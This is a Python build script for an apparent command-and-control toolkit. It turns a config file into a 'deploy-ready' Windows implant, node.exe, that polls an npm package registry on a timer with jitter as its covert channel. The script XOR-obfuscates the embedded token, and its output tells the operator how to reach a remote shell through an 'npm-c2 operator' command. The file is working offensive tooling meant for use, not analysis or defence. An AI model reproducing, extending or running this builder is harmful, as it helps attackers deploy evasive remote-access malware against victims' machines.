#!/usr/bin/env python3
"""One command from a config file to a deploy-ready node.exe.

    cp c2.example.json c2.json     # fill in token + package
    python3 make.py                # -> dist/node.exe (no arguments needed)

Everything the binary needs is baked in: registry, package, token, poll timing.
The token is XOR-obfuscated; the package name is public by nature.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "src"))

DEFAULTS = {
    "package": "",
    "token": "",
    "interval": 60,
    "jitter": 20,
    "name": "node",
    "arch": "both",
    "registry": None,
}


def load_config(path):
    if not os.path.exists(path):
        raise SystemExit(
            f"no {os.path.basename(path)}: copy c2.example.json and fill it in")
    with open(path, encoding="utf-8") as f:
        try:
            cfg = json.load(f)
        except json.JSONDecodeError as e:
            raise SystemExit(f"{path}: invalid JSON: {e}")
    merged = dict(DEFAULTS)
    merged.update({k: v for k, v in cfg.items() if not k.startswith("_")})
    if not merged["package"]:
        raise SystemExit(f"{path}: 'package' is required")
    if not merged["token"]:
        print("[!] no token in the config: the implant will execute but not "
              "reply. Add one for a usable channel.", file=sys.stderr)
    return merged


def main():
    cfg_path = sys.argv[1] if len(sys.argv) > 1 else os.path.join(HERE, "c2.json")
    cfg = load_config(cfg_path)

    cmd = [sys.executable, os.path.join(HERE, "native", "build_go.py"),
           "-p", cfg["package"],
           "--interval", str(cfg["interval"]),
           "--jitter", str(cfg["jitter"]),
           "--name", cfg["name"]]
    if cfg["token"]:
        cmd += ["-t", cfg["token"]]
    if cfg.get("registry"):
        cmd += ["--api-base", cfg["registry"]]
    if cfg.get("arch") in ("both", "386", "x86"):
        cmd.append("--32")

    print(f"[*] package={cfg['package']} interval={cfg['interval']}s "
          f"jitter={cfg['jitter']}s arch={cfg['arch']}")
    print(f"[*] token={'embedded' if cfg['token'] else 'NONE'}")
    p = subprocess.run(cmd, capture_output=True, text=True)
    sys.stdout.write(p.stdout)
    if p.returncode != 0:
        sys.stderr.write(p.stderr)
        return p.returncode

    dist = os.path.join(HERE, "native", "dist")
    print()
    print("[+] deploy-ready artifacts:")
    for name in sorted(os.listdir(dist)):
        if name.endswith(".exe"):
            size = os.path.getsize(os.path.join(dist, name))
            print(f"    {os.path.join(dist, name)}  ({size:,} bytes)")
    print()
    print("    Run it with no arguments; it polls on its own.")
    print(f"    Operate it with: npm-c2 operator -p {cfg['package']} -t <token> shell")
    return 0


if __name__ == "__main__":
    sys.exit(main())
